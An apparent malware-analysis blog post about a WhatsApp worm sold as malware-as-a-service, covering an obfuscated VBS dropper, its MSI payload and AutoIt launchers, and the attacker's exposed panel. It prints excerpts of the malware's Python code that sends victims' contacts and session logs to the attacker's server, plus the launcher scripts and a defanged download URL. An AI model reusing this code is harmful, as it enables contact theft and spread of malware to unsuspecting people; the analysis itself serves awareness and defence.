<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Analysis of MaaS</title>
    <link rel="stylesheet" href="../../style/styles.css">
    <link rel="stylesheet" href="model.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
</head>
<body>
    <div class="language-switcher">
        <a href="./whatsapp-worm-pt.html" class="language-btn">
            <i class="fas fa-globe"></i>
            <span>PT</span>
        </a>
    </div>  
    <main>
        <article class="article-container">
            <div class="article-header">
                <h1 class="article-title">Analysis of MaaS</h1>
                <div class="article-meta">
                    <span class="article-tags">
                        <i class="fas fa-tags"></i>
                        <span class="tag">Web Application</span>
                        <span class="tag">Cyber Crime</span>
                        <span class="tag">Reverse Engineering</span>
                        <span class="tag">Malware Analysis</span>
                    </span>
                    <span class="article-date"><i class="far fa-calendar"></i> November 14, 2025</span>
                </div>
            </div>

            <div class="article-content">
                <p><b>Warning:</b> This article is exclusively for educational and information security research purposes, as well as a way to alert about scams and malware distributed on the internet. The analysis was carried out in a controlled environment, without any illegal activity, and all information collected and accessed was public, accessible to any user. I do not encourage, support, or condone any hacking, invasion, exploitation, or malware use without proper authorization and appropriate legal requirements.</p>
                <hr>
                <h2>Introduction</h2>
                <p>Recently, someone close to me received a suspicious file on WhatsApp from an unknown person. She found it strange and sent it to me to analyze. I immediately recognized it as one of those WhatsApp "Worms" that use mass phishing to infect people.</p>
                <p>So I decided to do a quick analysis.</p>
                <p>The file came in <code>.vbs</code> format, which indicates it's a Visual Basic script</p>
                <img src="./assets/image1.png" alt="">
                <p>The message arrives with a sense of urgency, precisely to affect people who have a busy day and late deadlines, knowing they won't be able to think before clicking to open.</p>
                <p>Running the file through VirusTotal, we see that only 10 AVs detected the file as malicious</p>
                <img src="./assets/image2.png" alt="">
                <pre><code>HASH MD5: E76BA682C7C3D8D190AB089595BB70E5
HASH SHA256: C2F431E24127D4735C28A2074C75C612092A12EBB7294A5CBB0230C3274AA0E7</code></pre>
                <p>When starting the analysis of the <code>.vbs</code> file, we see that it's obfuscated with arithmetic operations on ASCII values and completely unnecessary mathematical operations.</p>
                <img src="./assets/image3.png" alt="">
                <p>It also has obfuscated variable names and useless code. I asked AI to write me a code for quick deobfuscation, and it actually worked.</p>
                <pre><code>import re

data = """ARRAY HERE"""
parts = [p.strip() for p in data.split(",")]

decoded = ""
for p in parts:
    try:
        n = eval(p)
        decoded += chr(n)
    except Exception:
        pass

print(decoded)</code></pre>
                <p>After deobfuscating the malware, we see its real functionality:</p>
                <img src="./assets/image4.png" alt="">
                <p>It's a dropper, downloading an MSI installer from the domain</p>
                <code>empautlipa[.]com/altor/installer.msi</code>
                <p><br>Thus, we see that it likely has two phases</p>
                <p>1. Spread the malware to the victim's WhatsApp contacts<br>2. Install a trojan on the victim's machine</p><br>
                <h2>WhatsApp Worm</h2>
                <img src="./assets/image5.png" alt="">
                <p>We start by analyzing the <code>vbiud.py</code> file, or rather, <code>whats.py</code>. This Python code contains all the "core" of WhatsApp communication and action automation</p>
                <img src="./assets/image6.png" alt="">
                <p>The flow works like this:</p>
                <p>The attacker launches the browser with the victim's WhatsApp Web -> Exfiltrates data via malicious URL APIs -> Generates automated messages -> Spreads the malware to all contacts</p>
                <p>Typical of these WhatsApp "worms" based on social engineering that we've been seeing recently.</p>
                <p>Within the code, we see other interesting functions for sending data, as we can see in this log function below:</p>
                <pre><code>def send_log(self, tipo: TipoLog, mensagem: str, detalhes: str = ""):
    """Envia log para o console e servidor"""
    # Cores para o console
    cores = {
        TipoLog.ERRO: '\033[91m',
        TipoLog.SUCESSO: '\033[92m',
        TipoLog.AVISO: '\033[93m',
        TipoLog.INFO: '\033[90m',
        TipoLog.INICIO: '\033[96m',
        TipoLog.FIM: '\033[96m'
    }
    reset_cor = '\033[0m'
    
    timestamp = datetime.now().strftime("%H:%M:%S")
    cor = cores.get(tipo, '')
    
    print(f"{cor}[{timestamp}] {mensagem}{reset_cor}")
    if detalhes:
        print(f"         {detalhes}")
    
    # Enviar para servidor
    try:
        dados = {
            'session_id': SESSION_ID,
            'nome_maquina': NOME_MAQUINA,
            'tipo': tipo.value,
            'mensagem': mensagem,
            'detalhes': detalhes,
            'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        requests.post(PHP_LOG_ENDPOINT, data=dados, timeout=3)
    except:
        pass</code></pre>
                <p>Thus, we can imagine what the attacker's panel should look like:</p>
                <pre><code>-- Attacker's Control Panel: --

[14:23:45] PC-JOAO-2024 | ▶ System started 
[14:23:47] PC-MARIA-DESKTOP | ✓ WhatsApp loaded 
[14:24:02] NOTEBOOK-PEDRO | ⏸ Sending paused 
[14:24:15] PC-ANA-HOME | ✓ 247 contacts sent to server</code></pre>
                <p>It also performs exfiltration of the victim's contacts, with the function having a very suggestive name.</p>
                <pre><code>def enviar_contatos_para_servidor(self, contatos: List[Contato]):
    """Envia os contatos obtidos do WhatsApp para o servidor PHP"""
    self.send_log(TipoLog.INFO, "Enviando contatos para o servidor")

    try:
        # Preparar dados para envio
        contatos_json = []
        for c in contatos:
            contatos_json.append({
                'numero': c.numero,
                'nome': c.nome
            })
        
        dados = {
            'session_id': SESSION_ID,
            'nome_maquina': NOME_MAQUINA,
            'contatos': json.dumps(contatos_json),
            'total': len(contatos),
            'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        
        # Enviar para o servidor
        response = requests.post(PHP_CONTACTS_ENDPOINT, data=dados, timeout=10)
        
        if response.status_code == 200:
            try:
                result = response.json()
                if result.get('success'):
                    self.send_log(TipoLog.SUCESSO, f"✓ {len(contatos)} contatos enviados ao servidor")
                else:
                    self.send_log(TipoLog.AVISO, "Servidor recebeu mas retornou erro")
            except:
                # Se não for JSON, assumir que foi enviado com sucesso
                self.send_log(TipoLog.SUCESSO, "✓ Contatos enviados ao servidor")
        else:
            self.send_log(TipoLog.AVISO, f"Servidor retornou status {response.status_code}")
            
    except Exception as e:
        self.send_log(TipoLog.AVISO, f"Não foi possível enviar contatos ao servidor: {e}")
        # Não é crítico se não conseguir enviar para o servidor</code></pre>
                <p>Well, in summary: it communicates with an API from the malicious domain to send and receive data, performs data exfiltration, and spreads the malware to contacts using APIs. Now, let's take a look at the <code>.msi</code> it downloads.</p>
                <br>
                <h2>MSI</h2>
                <p>We also ran it through VirusTotal and 11 AVs flag it as malicious.</p>
                <img src="./assets/image7.png" alt="">
                <p>We start by unpacking the <code>.msi</code> file</p>
                <pre><code>lessmsi.exe x .\installer.msi</code></pre>
                <p><code>.msi</code> files, or "Microsoft Installer", are standardized Windows installation packages that contain files, configuration information, and installations necessary to install, update, or remove software.</p>
                <p>Unlike a common <code>.exe</code>, the <code>.msi</code> is a structured installation package, processed by Windows Installer, functioning as a database with tables defining files, actions, and configurations.</p>
                <p>While an executable binary usually requires reverse engineering or decompilation, the <code>.msi</code> is not decompiled, it's just extracted and analyzed as a set of tables and files.</p>
                <p>Below is the file structure after unpacking</p>
                <pre><code>C:\USERS\RAVEN\DESKTOP\MALWARES\WPP-VBS\INSTALLER
└───SourceDir
    └───Public
        └───S4FSystems.S2D.65045730.8622.886
                8LOG39.tda
                8N3BdM.dmp
                feR0UqbB.exe
                kajr.bat
                kajr.vbs
                kvHeRzDt.log
                libeay32.dll
                sk4d.dll
                ssleay32.dll</code></pre>
                <br>
                <h2>AutoIt</h2>
                <p>It contains an executable <code>feR0UqbB.exe</code>, which is actually an AutoIt3.</p>
                <img src="./assets/image16.png" alt="">
                <p>AutoIt3 is a scripting language used to automate tasks on Windows, such as simulating mouse clicks and keystrokes. Malware can use compiled AutoIt to automate/package payloads.</p>
                <pre><code>MD5 AutoIt: 279274F8A137BF31425A9C2C14444B66
SHA256 AutoIt: bdd2b7236a110b04c288380ad56e8d7909411da93eed2921301206de0cb0dda1</code></pre>
                <p>We take a look at the contents of the <code>.bat</code> and <code>.vbs</code></p>
                <pre><code>type .\kajr.vbs
Set WshShell = CreateObject("WScript.Shell")
WshShell.CurrentDirectory = "C:\Public\S4FSystems.S2D.65045730.8622.886"
WshShell.Run "feR0UqbB.exe kvHeRzDt.log", 0, False
Set WshShell = Nothing

type .\kajr.bat
@echo off
cd /d "C:\Public\S4FSystems.S2D.65045730.8622.886"
start "" "C:\Public\S4FSystems.S2D.65045730.8622.886\feR0UqbB.exe" "C:\Public\S4FSystems.S2D.65045730.8622.886\kvHeRzDt.log"
exit</code></pre>
                <p>Both pass the <code>kvHeRzDt.log</code> file as an argument to AutoIt, so that's most likely where the malicious code is located.</p>
                <p>To better understand what it does, we would need to perform a dynamic analysis, but unfortunately I don't have all that time, so I'm going to see how the attacker's domain works, just out of curiosity.</p>
                <br>
                <h2>Malicious Domain</h2>
                <p>Upon entering the domain, it immediately starts downloading files to our page, but as we see in the code, there are some interesting endpoints.</p>
                <pre><code>/api/contacts.php
/api/logs.php
/api/api.php
/api/config.php</code></pre>
                <p>Searching a bit more, we discovered log files with more than 2GB exposed in the application, thus allowing us to see all requests made, including those from the attacker.</p>
                <pre><code>172.69.138.215 - - [06/Nov/2025:18:48:19 +0000] "GET /api/contacts.php?action=sessoes&_=1762454900466 HTTP/1.1" 200 37 "https://empautlipa.com/dashboard.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 Edg/142.0.0.0"</code></pre>
                <p>Analyzing the logs, we see some interesting endpoints, one of them being highly concerning!</p>
                <p>One of the endpoints was exposing a list with ALL infected people, where the attacker used it only as a form of graphical visualization of active sessions.</p>
                <p>We see that it also collects banking information from victims, probably stealing access and banking data:</p>
                <img src="./assets/image8.png" alt="">
                <p>At least more than 6 thousand people were infected by this malware, which is alarming. Going back to the analysis, we discovered that there is a login endpoint</p>
                <img src="./assets/image9.png" alt="">
                <p>And that there is an endpoint for uploading <code>.msi</code> files open without authentication, meaning anyone can upload a file of this type there.</p>
                <img src="./assets/image10.png" alt="">
                <p>Analyzing the application more deeply, we realize that this is a MaaS (Malware as a Service) with tutorials included</p>
                <img src="./assets/image11.png" alt="">
                <p>I discovered more obfuscated malicious code after downloading some files:</p>
                <img src="./assets/image12.png" alt="">
                <p>Anyway, probably more of the same. After some searches, I managed to find some interesting things, things that allowed me to access the administrative panel</p>
                <img src="./assets/image13.png" alt="">
                <p>We see that there are some functions that are available inside</p>
                <img src="./assets/image14.png" alt="">
                <p>With this example, we see how mass social engineering can affect many unsuspecting people. This type of attack is extremely dangerous! Because it spreads quickly, and seeing how weak the cybercriminal's own security is, we know that for them all of this is disposable.</p>
                <img src="./assets/image15.png" alt="">               
                <p>The person who hired this service probably doesn't even know how to use this panel properly and is just an amateur. The real problem is the person who built this, because this will repeat itself many times, if this domain goes down another 10 will go up and so on.</p>
                <p>That's why it's important to alert people close to us about the dangers that exist when receiving any type of unexpected (or even expected) file on social networks and messaging apps like WhatsApp.</p>
                <p>In this case, the malware affected only specifically WhatsApp Web on Windows computers, which saved many people from being infected. I would also like to analyze the executable and the malicious code it calls at runtime, but I have my obligations to fulfill, so I won't go beyond this.</p>
            </div>

            <div class="article-footer">
                <a href="../../index.html" class="back-link"><i class="fas fa-arrow-left"></i> Back to home</a>
            </div>
        </article>
    </main>

    <footer>
        <div class="social-links">
            <a href="https://github.com/lsbxa" target="_blank"><i class="fab fa-github"></i></a>
            <a href="https://www.linkedin.com/in/marcelolisboa7/" target="_blank"><i class="fab fa-linkedin"></i></a>
        </div>
        <p>&copy; 2025 Memory Leak</p>
    </footer>
    <div id="imageModal" class="image-modal">
        <span class="image-modal-close">&times;</span>
        <img id="modalImage" src="" alt="">
    </div>

    <script>
        const modal = document.getElementById('imageModal');
        const modalImg = document.getElementById('modalImage');
        const closeBtn = document.querySelector('.image-modal-close');
        const images = document.querySelectorAll('.article-content img');

        images.forEach(img => {
            img.addEventListener('click', function() {
                modal.classList.add('active');
                modalImg.src = this.src;
            });
        });

        closeBtn.addEventListener('click', () => {
            modal.classList.remove('active');
        });

        modal.addEventListener('click', (e) => {
            if (e.target === modal) {
                modal.classList.remove('active');
            }
        });

        document.addEventListener('keydown', (e) => {
            if (e.key === 'Escape' && modal.classList.contains('active')) {
                modal.classList.remove('active');
            }
        });
    </script>
</body>

</html>
